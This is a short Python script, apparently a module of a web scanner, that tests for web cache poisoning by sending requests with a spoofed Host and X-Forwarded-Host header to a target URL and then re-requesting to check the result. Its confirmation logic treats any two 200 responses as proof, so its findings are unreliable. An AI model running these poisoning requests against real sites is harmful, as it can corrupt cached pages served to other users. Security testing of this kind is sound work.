import requests
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
from list import *

def manipulate_request(original_headers):
    if original_headers is None:
        print("No headers to manipulate.")
        return None

    malicious_host = "example.com"
    modified_headers = original_headers.copy()
    modified_headers["Host"] = malicious_host
    modified_headers.pop("Cache-Control", None)
    modified_headers["X-Forwarded-Host"] = "controlled-domain.com"
    return modified_headers

def get_session_with_retries():
    session = requests.Session()
    retries = Retry(total=0, backoff_factor=0, status_forcelist=[502, 503, 504])
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    return session

def poison_cache(modified_headers, target_url):
    if modified_headers is None:
        print("No headers to use for poisoning cache.")
        return

    session = get_session_with_retries()
    try:
        response = session.get(target_url, headers=modified_headers, timeout=2)
        if response.status_code == 200:
            print("Cache successfully poisoned via Host header.")
            return response.status_code
        else:
            print(f"Failed to poison cache: {response.status_code}")
            return response.status_code
    except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
        print(f"Error poisoning cache: {e}")

def exploit_cache(original_headers, target_url,response_code):
    if original_headers is None:
        print("No headers to use for exploiting cache.")
        return
    
    session = get_session_with_retries()
    try:
        response = session.get(target_url, headers=original_headers, timeout=2)
        if response.status_code == 200 and response_code==200:
            print("Web Cache Poisoning via Host Header is confirmed.")
            my_list.append("Web Cache Poisoning via Host Header is confirmed.")
        else:
            print(f"Failed to exploit cache: {response.status_code}")
    except (requests.exceptions.RequestException, requests.exceptions.Timeout) as e:
        print(f"Error exploiting cache: {e}")


def hostmain(url, header):

 original_headers = header
 if original_headers:

    modified_headers = manipulate_request(original_headers)

    response_code=poison_cache(modified_headers, url)

    exploit_cache(original_headers, url,response_code)